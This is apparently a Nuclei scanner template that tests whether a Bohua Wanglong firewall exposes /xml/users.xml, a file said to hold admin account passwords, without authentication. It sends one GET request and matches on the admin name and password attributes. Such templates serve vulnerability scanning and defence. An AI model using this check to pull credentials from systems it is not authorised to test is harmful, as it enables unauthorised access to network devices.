id: bohuawanglong-users-xml-password-leak

info:
  name: 博华网龙防火墙 users.xml 未授权访问
  author: SleepingBag945
  severity: high
  description: |-
    博华网龙防火墙 users.xml文件 可被任意用户读取，其中包含登录的账号密码
  reference: |
    -
  tags: Unauthorized

http:
  - raw:
      - |
        GET /xml/users.xml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'name="admin"'
        part: body
      - type: word
        words:
          - 'pwd="'
        part: body